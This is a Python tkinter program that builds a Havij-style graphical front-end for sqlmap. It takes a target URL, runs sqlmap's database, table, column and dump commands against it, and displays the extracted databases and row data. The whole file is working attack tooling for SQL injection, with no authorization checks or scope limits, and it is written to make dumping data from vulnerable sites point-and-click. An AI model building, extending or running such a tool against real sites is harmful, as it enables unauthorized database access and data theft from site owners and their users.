import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import subprocess
import threading
import sys
import os
import re
import socket
from urllib.parse import urlparse

class HavijCloneGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Havij Pro - Advanced SQL Injection Tool")
        self.root.geometry("1000x750")
        self.root.configure(bg="#f0f0f0")
        
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", rowheight=25, font=("Arial", 10))
        style.configure("Treeview.Heading", font=("Arial", 10, "bold"), background="#e0e0e0")
        
        # ================= TOP FRAME =================
        top_frame = tk.Frame(root, bg="#f0f0f0", pady=10, padx=10)
        top_frame.pack(fill=tk.X)
        
        tk.Label(top_frame, text="Target:", bg="#f0f0f0", font=("Arial", 10)).grid(row=0, column=0, sticky="w")
        self.url_entry = tk.Entry(top_frame, font=("Arial", 10), width=80, relief="solid", bd=1)
        self.url_entry.grid(row=0, column=1, padx=10)
        
        self.analyze_btn = tk.Button(top_frame, text="▶\nAnalyze", command=self.analyze_url, 
                                     bg="#f0f0f0", relief="flat", cursor="hand2", font=("Arial", 9))
        self.analyze_btn.grid(row=0, column=2, padx=5, rowspan=2)

        # ================= TOOLBAR =================
        toolbar_frame = tk.Frame(root, bg="#f0f0f0", pady=5, padx=10)
        toolbar_frame.pack(fill=tk.X)

        actions = [
            ("🛑 Stop", self.stop_process),
            ("🛢️ Get DBs", self.get_dbs),
            ("📊 Get Tables", self.get_tables),
            ("📑 Get Columns", self.get_columns),
            ("📥 Get Data", self.get_data)
        ]
        
        for text, cmd in actions:
            btn = tk.Button(toolbar_frame, text=text, command=cmd, bg="#ffffff", relief="solid", bd=1, cursor="hand2", font=("Arial", 9))
            btn.pack(side=tk.LEFT, padx=5)

        self.batch_var = tk.BooleanVar(value=True)
        tk.Checkbutton(toolbar_frame, text="Auto Mode (Batch)", variable=self.batch_var, bg="#f0f0f0").pack(side=tk.RIGHT)

        # ================= PANED WINDOW =================
        self.paned_window = ttk.PanedWindow(root, orient=tk.HORIZONTAL)
        self.paned_window.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # --- LEFT PANE (Treeview) ---
        left_frame = tk.Frame(self.paned_window, bg="white", relief="solid", bd=1)
        self.paned_window.add(left_frame, weight=1)
        
        tk.Label(left_frame, text="Databases & Tables", bg="#e0e0e0", font=("Arial", 9, "bold")).pack(fill=tk.X)
        
        self.tree = ttk.Treeview(left_frame, show="tree")
        self.tree.pack(fill=tk.BOTH, expand=True)
        self.tree.bind("<Button-1>", self.toggle_checkbox)
        
        tree_scroll = ttk.Scrollbar(self.tree, orient="vertical", command=self.tree.yview)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=tree_scroll.set)

        # --- RIGHT PANE (Data Grid) ---
        right_frame = tk.Frame(self.paned_window, bg="white", relief="solid", bd=1)
        self.paned_window.add(right_frame, weight=2)
        
        tk.Label(right_frame, text="Dumped Data", bg="#e0e0e0", font=("Arial", 9, "bold")).pack(fill=tk.X)
        
        self.data_grid = ttk.Treeview(right_frame, show="headings")
        self.data_grid.pack(fill=tk.BOTH, expand=True)
        
        grid_scroll = ttk.Scrollbar(self.data_grid, orient="vertical", command=self.data_grid.yview)
        grid_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.data_grid.configure(yscrollcommand=grid_scroll.set)

        # ================= BOTTOM FRAME (Log) =================
        bottom_frame = tk.Frame(root, bg="#f0f0f0", padx=10, pady=5)
        bottom_frame.pack(fill=tk.X, side=tk.BOTTOM)

        status_frame = tk.Frame(bottom_frame, bg="#f0f0f0")
        status_frame.pack(fill=tk.X)
        
        self.status_lbl = tk.Label(status_frame, text="Status: I'm IDLE", fg="blue", bg="#f0f0f0", font=("Arial", 9, "bold"))
        self.status_lbl.pack(side=tk.LEFT)
        
        clear_btn = tk.Button(status_frame, text="Clear Log", command=self.clear_log, fg="blue", bg="#f0f0f0", relief="flat", cursor="hand2")
        clear_btn.pack(side=tk.RIGHT)

        self.log_area = scrolledtext.ScrolledText(bottom_frame, height=10, font=("Consolas", 9), relief="solid", bd=1)
        self.log_area.pack(fill=tk.X, pady=2)
        
        self.log_area.tag_config('blue', foreground='#0000FF') 
        self.log_area.tag_config('green', foreground='#008000') 
        self.log_area.tag_config('red', foreground='#FF0000') 
        self.log_area.tag_config('black', foreground='#000000')

        # State Variables
        self.current_process = None
        self.current_mode = None
        self.active_db_node = None
        self.active_table_node = None
        self.dump_cols = [] 
        self.is_analyze_mode = False
        
        # New State Variables for Column Ordering
        self.selected_cols_order = [] 
        self.sqlmap_col_order = None

        # --- Startup Log ---
        self.log_area.insert(tk.END, "Havij 15.71 pro ready!\n", 'green')

    # --- Tree Checkbox Logic ---
    def toggle_checkbox(self, event):
        row_id = self.tree.identify_row(event.y)
        if not row_id: return
        
        item_text = self.tree.item(row_id, "text")
        item_tags = self.tree.item(row_id, "tags")
        
        if item_text.startswith("☐ "):
            self.tree.item(row_id, text=item_text.replace("☐ ", "☑ ", 1))
            # Track column selection order
            if item_tags and item_tags[0] == "col":
                if row_id not in self.selected_cols_order:
                    self.selected_cols_order.append(row_id)
                    
        elif item_text.startswith("☑ "):
            self.tree.item(row_id, text=item_text.replace("☑ ", "☐ ", 1))
            # Remove column from order tracker if unchecked
            if item_tags and item_tags[0] == "col":
                if row_id in self.selected_cols_order:
                    self.selected_cols_order.remove(row_id)

    def get_checked_items(self, expected_tag=None):
        checked = []
        def traverse(node):
            text = self.tree.item(node, "text")
            item_tags = self.tree.item(node, "tags")
            if text.startswith("☑ "):
                clean_name = text.replace("☑ ", "")
                if not expected_tag or (item_tags and item_tags[0] == expected_tag):
                    checked.append((node, clean_name))
            for child in self.tree.get_children(node):
                traverse(child)
        for root_node in self.tree.get_children():
            traverse(root_node)
        return checked

    def add_to_tree(self, item_type, name, parent_id=""):
        node_id = f"{item_type}::{name}" if not parent_id else f"{parent_id}::{name}"
        if self.tree.exists(node_id): return node_id
        self.tree.insert(parent_id, "end", iid=node_id, text=f"☐ {name}", open=True, tags=(item_type,))
        return node_id

    # --- Background Execution ---
    def get_engine_path(self):
        current_dir = os.path.dirname(os.path.abspath(__file__))
        return os.path.join(current_dir, "sqlmap.py")

    def run_command(self, extra_args, mode):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showwarning("URL Missing", "Please enter target URL first.")
            return

        engine_path = self.get_engine_path()
        if not os.path.exists(engine_path):
            messagebox.showerror("Error", "sqlmap.py not found in the same folder!")
            return

        self.current_mode = mode
        command = [sys.executable, engine_path, "-u", url]
        if self.batch_var.get(): command.append("--batch")
        command.extend(extra_args)

        # Log & Status update like Havij
        if mode == "dbs" and self.is_analyze_mode:
            self.log_area.insert(tk.END, f"Analyzing {url}\n", 'black')
            try:
                domain = urlparse(url).netloc.split(':')[0]
                ip = socket.gethostbyname(domain)
                self.log_area.insert(tk.END, f"Host IP: {ip}\n", 'black')
            except: pass
            self.update_status("Analyzing target", "red")
        elif mode == "dbs":
            self.update_status("Finding Databases", "red")
        elif mode == "tables":
            self.update_status("Finding Tables", "red")
        elif mode == "columns":
            self.update_status("Finding Columns", "red")
        elif mode == "data":
            self.update_status("Getting Column data", "orange")
        
        self.log_area.see(tk.END)
        
        thread = threading.Thread(target=self.execute_engine, args=(command,))
        thread.daemon = True
        thread.start()

    def execute_engine(self, command):
        try:
            flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
            self.current_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, creationflags=flags)
            for line in self.current_process.stdout:
                self.root.after(0, self.update_output, line)
            self.current_process.wait()
            
            finished_mode = self.current_mode
            self.current_mode = None
            self.root.after(0, self.update_status, "I'm IDLE", "blue")
            self.root.after(0, self.post_process_task, finished_mode)

        except Exception as e:
            self.root.after(0, self.update_output, f"Error: {str(e)}\n", 'red')

    def post_process_task(self, mode):
        if mode == "dbs" and self.is_analyze_mode:
            db_nodes = self.tree.get_children("")
            if len(db_nodes) == 1:
                node_id = db_nodes[0]
                item_text = self.tree.item(node_id, "text")
                if item_text.startswith("☐ "):
                    self.tree.item(node_id, text=item_text.replace("☐ ", "☑ ", 1))

    def update_status(self, text, color="blue"):
        self.status_lbl.config(text=f"Status: {text}", fg=color)

    # --- The Havij Log Translator Engine ---
    def update_output(self, text, force_tag=None):
        if force_tag: 
            self.log_area.insert(tk.END, text, force_tag)
            self.log_area.see(tk.END)
            return

        clean_text = text.strip()
        if not clean_text: return

        # System Info Translation
        if "web application technology:" in clean_text:
            tech = clean_text.split("technology:")[1].strip()
            self.log_area.insert(tk.END, f"Web Server: {tech}\n", 'black')
        elif "back-end DBMS:" in clean_text:
            dbms = clean_text.split("DBMS:")[1].strip()
            self.log_area.insert(tk.END, f"DB Server: {dbms}\n", 'black')
        elif "current database:" in clean_text:
            match = re.search(r"current database:\s+'([^']+)'", clean_text)
            if match:
                self.log_area.insert(tk.END, f"Current DB: {match.group(1)}\n", 'black')
        elif "injectable" in clean_text and "parameter" in clean_text:
            match = re.search(r"is '(.*?)' injectable", clean_text)
            if match:
                self.log_area.insert(tk.END, f"Injection type is {match.group(1)}\n", 'black')
                self.log_area.insert(tk.END, "Target Vulnerable :D\n", 'green')

        # Data Extraction based on Mode
        if self.current_mode == "dbs":
            if clean_text.startswith("[*] ") and "shutting down" not in clean_text.lower():
                db_name = clean_text.replace("[*] ", "").strip()
                if db_name and " " not in db_name:
                    if self.is_analyze_mode and db_name.lower() == "information_schema":
                        pass
                    else:
                        self.add_to_tree("db", db_name)
                        self.log_area.insert(tk.END, f"Data Base Found: {db_name}\n", 'black')

        elif self.current_mode == "tables":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                parts = [p.strip() for p in clean_text.split("|") if p.strip()]
                if len(parts) >= 1:
                    tbl_name = parts[0]
                    if tbl_name.lower() not in ["table", "tables"] and tbl_name.replace("-", "").replace("_", "").strip():
                        if self.active_db_node:
                            self.add_to_tree("tbl", tbl_name, parent_id=self.active_db_node)
                            self.log_area.insert(tk.END, f"Table found: {tbl_name}\n", 'black')

        elif self.current_mode == "columns":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                parts = [p.strip() for p in clean_text.split("|") if p.strip()]
                if len(parts) >= 1:
                    col_name = parts[0]
                    if col_name.lower() not in ["column", "type", "columns"] and col_name.replace("-", "").replace("_", "").strip():
                        if self.active_table_node:
                            self.add_to_tree("col", col_name, parent_id=self.active_table_node)
                            self.log_area.insert(tk.END, f"Column found: {col_name}\n", 'black')

        elif self.current_mode == "data":
            if clean_text.startswith("|") and clean_text.endswith("|") and not clean_text.startswith("|+"):
                raw_parts = clean_text.split("|")[1:-1]
                parts = [p.strip() for p in raw_parts]
                
                # Check if this line is the SQLMap Header Table
                if not getattr(self, 'sqlmap_col_order', None):
                    lower_dump_cols = [c.lower() for c in self.dump_cols]
                    # If this row contains our selected columns, it's the header
                    if any(p.lower() in lower_dump_cols for p in parts):
                        self.sqlmap_col_order = parts
                        return
                
                # Insert Actual Data
                if getattr(self, 'sqlmap_col_order', None) and len(parts) == len(self.sqlmap_col_order):
                    ordered_parts = []
                    lower_sqlmap_cols = [c.lower() for c in self.sqlmap_col_order]
                    
                    # Map the Data according to User's GUI Selection Order
                    for expected_col in self.dump_cols:
                        try:
                            idx = lower_sqlmap_cols.index(expected_col.lower())
                            ordered_parts.append(parts[idx])
                        except ValueError:
                            ordered_parts.append("")

                    # Validate and Insert to DataGrid
                    if "".join(ordered_parts).replace("-", "").replace("_", "").strip():
                        self.data_grid.insert("", "end", values=ordered_parts)
                        # Log it exactly in the order user selected
                        for idx, col in enumerate(self.dump_cols):
                            self.log_area.insert(tk.END, f"Data Found: {col}={ordered_parts[idx]}\n", 'black')

        self.log_area.see(tk.END)

    # --- Button Actions ---
    def analyze_url(self):
        self.is_analyze_mode = True 
        self.tree.delete(*self.tree.get_children()) 
        self.run_command(["--dbs"], mode="dbs")

    def get_dbs(self):
        self.is_analyze_mode = False 
        self.tree.delete(*self.tree.get_children()) 
        self.run_command(["--dbs"], mode="dbs")

    def get_tables(self):
        checked_dbs = self.get_checked_items(expected_tag="db")
        if not checked_dbs: return messagebox.showwarning("Error", "Select Database!")
        self.active_db_node = checked_dbs[0][0]
        self.run_command(["-D", checked_dbs[0][1], "--tables"], mode="tables")

    def get_columns(self):
        checked_tables = self.get_checked_items(expected_tag="tbl")
        if not checked_tables: return messagebox.showwarning("Error", "Select Table!")
        self.active_table_node = checked_tables[0][0]
        tbl_name = checked_tables[0][1]
        db_name = self.tree.item(self.tree.parent(self.active_table_node), "text").replace("☑ ", "").replace("☐ ", "")
        self.run_command(["-D", db_name, "-T", tbl_name, "--columns"], mode="columns")

    def get_data(self):
        # Fetch Columns based on CLICK ORDER
        checked_columns = []
        for node_id in self.selected_cols_order:
            if self.tree.exists(node_id):
                text = self.tree.item(node_id, "text")
                if text.startswith("☑ "):
                    checked_columns.append((node_id, text.replace("☑ ", "")))
                    
        if not checked_columns: return messagebox.showwarning("Error", "Select Columns!")
        
        self.dump_cols = [item[1] for item in checked_columns]
        self.sqlmap_col_order = None # Reset for fresh data map
        
        self.data_grid.delete(*self.data_grid.get_children())
        self.data_grid["columns"] = self.dump_cols
        for col in self.dump_cols:
            self.data_grid.heading(col, text=col)
            self.data_grid.column(col, width=120, anchor="center")

        tbl_node = self.tree.parent(checked_columns[-1][0])
        db_node = self.tree.parent(tbl_node)
        tbl_name = self.tree.item(tbl_node, "text").replace("☑ ", "").replace("☐ ", "")
        db_name = self.tree.item(db_node, "text").replace("☑ ", "").replace("☐ ", "")
        
        self.run_command(["-D", db_name, "-T", tbl_name, "-C", ",".join(self.dump_cols), "--dump"], mode="data")

    def stop_process(self):
        if self.current_process:
            self.current_process.terminate()
            self.update_output("Canceling...\n", "red")
            self.update_output("Job Canceled!\n", "red")
            self.update_status("Stopped", "red")

    def clear_log(self):
        self.log_area.delete('1.0', tk.END)

if __name__ == "__main__":
    root = tk.Tk()
    app = HavijCloneGUI(root)
    root.mainloop()
